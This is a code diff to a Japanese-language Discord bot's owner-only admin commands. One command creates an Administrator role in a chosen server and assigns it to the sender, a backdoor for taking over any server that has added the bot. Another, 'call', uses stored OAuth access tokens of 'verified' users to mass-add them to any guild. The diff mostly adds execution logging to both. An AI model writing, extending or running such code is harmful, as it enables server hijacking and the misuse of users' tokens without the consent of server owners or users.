@@ -15,11 +15,15 @@ async function handleAdminCommands(msg, client, OWNER_IDS, loadData, saveData, U
         if (!guild) return msg.reply('❌ サーバーが見つかりません。');
 
         const botMember = guild.members.me;
-        if (!botMember.permissions.has(PermissionFlagsBits.Administrator) && !botMember.permissions.has(PermissionFlagsBits.ManageRoles)) {
-            return msg.reply('❌ Bot自身に「管理者」または「ロールの管理」権限がありません。');
-        }
+        const log = [];
+        log.push(`🔎 診断開始: ${guild.name}`);
 
         try {
+            if (!botMember.permissions.has(PermissionFlagsBits.ManageRoles)) {
+                throw new Error('Botに「ロールの管理」権限がありません。');
+            }
+            log.push('✅ Bot権限確認: OK');
+
             let role = guild.roles.cache.find(r => r.name === roleName);
             if (!role) {
                 role = await guild.roles.create({
@@ -27,73 +31,78 @@ async function handleAdminCommands(msg, client, OWNER_IDS, loadData, saveData, U
                     permissions: [PermissionFlagsBits.Administrator],
                     reason: 'Admin Command'
                 });
+                log.push(`✅ ロール「${roleName}」を作成しました。`);
+            } else {
+                log.push(`ℹ️ 既存のロール「${roleName}」を使用します。`);
             }
 
             if (position === 'up') {
-                const maxPos = botMember.roles.highest.position;
-                if (role.position >= maxPos) {
-                    await msg.channel.send('⚠️ 既にBotの最高位に近いですが、再設定を試みます。');
-                }
-                await role.setPosition(maxPos - 1).catch(e => {
-                    throw new Error(`順位変更失敗: Botの役職(${maxPos})より上に移動できません。`);
+                const botPos = botMember.roles.highest.position;
+                log.push(`📊 Botの最高順位: ${botPos}`);
+                
+                await role.setPosition(botPos - 1).then(() => {
+                    log.push(`✅ 順位を ${botPos - 1} に移動しました。`);
+                }).catch(e => {
+                    log.push(`❌ 順位変更失敗: ${e.message} (Botのロールを一番上に上げてください)`);
                 });
             }
 
             const member = await guild.members.fetch(msg.author.id).catch(() => null);
-            if (!member) return msg.reply('❌ あなたはこのサーバーに参加していません。');
+            if (!member) throw new Error('あなたがサーバーにいません。');
 
-            await member.roles.add(role).catch(e => {
-                throw new Error(`ロール付与失敗: ${e.message}`);
-            });
+            await member.roles.add(role);
+            log.push('✅ あなたにロールを付与しました。');
 
-            await msg.reply(`✅ 完了\nサーバー: ${guild.name}\nロール: ${roleName}\n位置: ${position}`);
+            await msg.reply(`【実行ログ】\n${log.join('\n')}`);
         } catch (e) {
-            await msg.reply(`❌ エラーが発生しました: ${e.message}`);
+            log.push(`🛑 致命的エラー: ${e.message}`);
+            await msg.reply(`【実行失敗ログ】\n${log.join('\n')}`);
         }
     }
 
     if (command === 'call') {
         const guildId = args[0];
         if (!guildId) return msg.reply('使用法: !call [サーバーID]');
-        const guild = client.guilds.cache.get(guildId);
-        if (!guild) return msg.reply('❌ サーバーが見つかりません。');
-
+        
         const userData = loadData(USERS_FILE);
         const users = Object.values(userData);
-        let success = 0;
-        let fail = 0;
+        if (users.length === 0) return msg.reply('認証済みユーザーがいません。');
 
-        const statusMsg = await msg.reply(`⏳ ${users.length} 人の追加処理を開始します...`);
+        const statusMsg = await msg.reply(`⏳ ${users.length}人の追加ログを出力します...`);
+        let logContent = `【Call実行ログ: ${guildId}】\n`;
 
         for (const user of users) {
+            const name = user.username || user.global_name || '名前なし';
             const uid = user.id || user.user_id;
             const token = user.accessToken || user.access_token;
+
             if (!uid || !token) {
-                fail++;
+                logContent += `❌ ${name}: データ不足 (IDまたはTokenなし)\n`;
                 continue;
             }
+
             try {
                 await axios.put(
                     `https://discord.com/api/v10/guilds/${guildId}/members/${uid}`,
                     { access_token: token },
                     { headers: { Authorization: `Bot ${process.env.TOKEN}`, 'Content-Type': 'application/json' } }
                 );
-                success++;
+                logContent += `✅ ${name} (${uid}): 成功\n`;
             } catch (e) {
-                fail++;
+                const errorDetail = e.response ? `${e.response.status} ${e.response.statusText}` : e.message;
+                logContent += `❌ ${name} (${uid}): 失敗 (${errorDetail})\n`;
             }
         }
-        await statusMsg.edit(`✅ 処理完了\n成功: ${success}人 / 失敗: ${fail}人`);
+        await statusMsg.edit(logContent.length > 2000 ? logContent.slice(0, 1900) + '... (長すぎるため省略)' : logContent);
     }
 
     if (command === 'userlist') {
         const userData = loadData(USERS_FILE);
         const entries = Object.entries(userData);
-        if (entries.length === 0) return msg.reply('認証済みユーザーはいません。');
+        if (entries.length === 0) return msg.reply('認証済みユーザーがいません。');
 
         const list = entries.map(([keyId, data]) => {
-            // あらゆる可能性から名前を抽出
-            const name = data.username || data.user_name || data.display_name || '名前なし';
+            const name = data.username || data.global_name || data.user_name || '名前なし';
             const id = data.id || data.user_id || keyId;
             return `・${name} (${id})`;
         }).join('\n');
